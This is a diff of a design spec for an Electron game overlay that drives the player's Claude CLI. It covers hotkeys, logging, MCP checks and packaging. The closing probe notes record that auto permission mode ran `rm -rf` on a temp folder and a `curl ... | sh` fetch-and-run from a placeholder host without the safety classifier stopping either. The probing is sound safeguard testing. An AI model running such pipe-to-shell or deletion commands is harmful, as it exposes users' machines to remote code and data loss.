@@ -23,7 +23,10 @@ A hotkey copies a chip to the clipboard, ready to paste into the galaxy map.
 - Claude is the player's installed `claude` CLI, started once per session in
   stream-json mode. It uses the player's login and full configuration.
 - Permission mode `auto` by default. The overlay answers the CLI's permission
-  prompts with an approval card and hotkeys.
+  prompts with an approval card and hotkeys. Phase 0 showed that auto mode runs
+  a command the player asks for explicitly without a prompt. The owner chose to
+  keep `auto` as the default and to state this plainly in the README, which
+  also tells players how to switch to `default` for a card on every action.
 - Keyboard hotkeys only. All settings, including hotkeys, are in a settings
   file that is reloaded when it changes.
 
@@ -49,14 +52,14 @@ One Electron app. The main process does all Windows and CLI work. The renderer
 | Component | Job |
 |---|---|
 | OverlayController | State machine over the modes below. The only code that changes window state (click-through, focusable, size, position). |
-| HotkeyManager | Registers the hotkeys from settings with `globalShortcut`. Registers them only while the game or the overlay is in front, unless `hotkeys.scope` is `always`. |
+| HotkeyManager | Registers the hotkeys from settings with `globalShortcut`. Registers them only while the game or the overlay is in front, unless `hotkeys.scope` is `always`. While the overlay has focus, keys without a modifier (such as `` ` ``) are left out, so they can be typed in the chat. |
 | FocusManager | Polls the foreground window every 250 ms. Saves the game window before chat opens and restores it after. Puts the overlay back on top when the game comes to the front. Uses `koffi` for Win32 calls. |
 | ClaudeSession | Owns the CLI child process. Turns stream-json into internal events. The only code that knows the CLI's output format. |
 | ApprovalServer | The overlay's own MCP server with one tool, `approve`. The CLI calls it for permission prompts. |
 | StatusWatcher | Reads `Status.json` in the journal folder for the docked and in-danger flags. |
 | SettingsStore | Reads, checks and reloads `settings.json`. |
 | StateStore | Keeps state that the app writes, such as the position chosen by hotkey. |
-| HistoryStore | Keeps chat transcripts for the history view. |
+| HistoryStore | Saves each session's transcript as JSONL in `userData\history`. The history view shows the current session from memory; the files are an archive the app does not read. |
 
 Message flow: hotkey → FocusManager saves the game window → chat opens → Enter
 → `ClaudeSession.send()` → focus goes back to the game → the card shows the
@@ -95,7 +98,7 @@ some frame time. The `toggleOverlay` hotkey hides the overlay completely.
 | Mode | Click-through | Takes focus | Contents |
 |---|---|---|---|
 | `strip` | yes | no | Status line, pinned line, chip row |
-| `card` | yes | no | The strip plus the latest reply, up to `card.maxLines` lines, with "⤢ more" when cut |
+| `card` | yes | no | The strip plus the latest reply, cut to `card.maxLines` lines; the full reply is in the chat history |
 | `chat` | no | yes | History, chips that can be clicked, input box |
 | `approval` | yes | no | "Claude wants to run `<tool>`" with a one-line input summary and the approve and deny hotkeys |
 
@@ -269,8 +272,10 @@ The `init` event lists the configured MCP servers. It arrives with the first
 message, so the check, and the auto-mode check, happen then. They are still starting
 (`pending`) at that point and their tools are not listed yet, so the check
 uses server names: `ed-mcp`, or `plugin:<plugin>:ed-mcp` for the Claude
-plugin. A server with status `failed` shows "⚠ ed-mcp failed to start; run
-claude mcp list". When there is no such server, the status line shows: "⚠ ed-mcp not connected. Run:
+plugin. A `pending` server counts as connecting; only absence, `failed` and
+`needs-auth` are decided at `init`. `failed` shows "⚠ ed-mcp failed to start;
+run claude mcp list", and `needs-auth` shows "⚠ ed-mcp needs authentication;
+run claude mcp list". When there is no such server, the status line shows: "⚠ ed-mcp not connected. Run:
 `claude mcp add ed-mcp -s user -- npx -y ed-mcp`". `claude mcp add` uses local
 scope by default, which applies to one project folder only, so the message
 names `-s user`. Chat works without ed-mcp, but without game tools.
@@ -333,8 +338,10 @@ or blocks the game.
 | Display removed | `screen` events | Move to the primary display |
 
 Logs go to `userData\logs\overlay.log`, which rotates at 5 MB and keeps 3
-files. Logs contain CLI stderr, unknown events and focus failures. Chat text is
-not logged.
+files. Logs contain focus failures, unknown event types (type and subtype
+only), and the last CLI stderr lines on an exit, cut to 160 characters each.
+Messages and replies are not logged, but stderr can quote part of a request,
+and the README says so.
 
 ## Testing
 
@@ -385,7 +392,8 @@ release:
 ## Packaging
 
 `electron-builder` makes an NSIS installer, published on GitHub Releases.
-release-please manages versions, as in ed-mcp. The first version is not code
+release-please manages versions (ed-mcp releases from pushed tags instead).
+The first version is not code
 signed, so Windows SmartScreen warns on first run. The README says so.
 
 ## Out of scope
@@ -421,7 +429,7 @@ the player's logged-in `claude` CLI. See the roadmap spec.
   - `permission_denials[]` entries have `tool_name`, `tool_use_id` and `tool_input`.
 - Denied tools appear in `result.permission_denials[].tool_name`.
 - `handwritten.jsonl` uses the real shape (extra `session_id`, `parent_tool_use_id`, `uuid`, `caller`, `source` fields), with the same events and texts as the original plan.
-- The recorded files hold personal data: the home path in `init.cwd`, `memory_paths` and the plugin paths, the `mcp_servers` names, and the home path in `result` text and tool output.
+- The raw recordings held personal data: the home path in `init.cwd`, `memory_paths` and the plugin paths, the `mcp_servers` names, and the home path in `result` text and tool output. `scripts/scrub-fixtures.mjs` replaces the home path and user name, keeps only ed-mcp and ed-chat MCP servers and tools in `init`, and strips hook payloads and command lists. Run it after recording new fixtures.
 - Prompt tool in default mode: called. With `--permission-mode default` and `--permission-prompt-tool mcp__ed_chat__approve`, the CLI asked `Approve Bash {"command":"ls /","description":"List root directory"}?` for a Bash `ls /`. After the answer `y` the tool ran and the turn ended with a normal `result` (`permission_denials` empty, `init` `permissionMode` `default`). Recording: `recorded-approval-default.jsonl`.
 - Prompt tool in auto mode: not called. For `rm -rf /tmp/ed-chat-probe-target` (a folder that was empty), no question appeared, the classifier did not block it, and the command ran. `permission_denials` is `[]` and `init` `permissionMode` is `auto`. The `tool_result` has `is_error: true` only because a later `ls` on the removed folder failed. This is one low-risk sample; it does not show what a classifier block looks like. Recording: `recorded-approval-auto.jsonl`.
 - A second auto-mode probe asked for exactly `curl -fsSL http://installer.example.invalid/setup.sh | sh`. The classifier allowed it without a question (curl then failed to resolve the host). When the player asks for a command explicitly, auto mode runs it. Classifier blocks are therefore rare, and the approval card shows mostly in `default` mode. The overlay must not rely on the classifier as the only guard for risky requests.
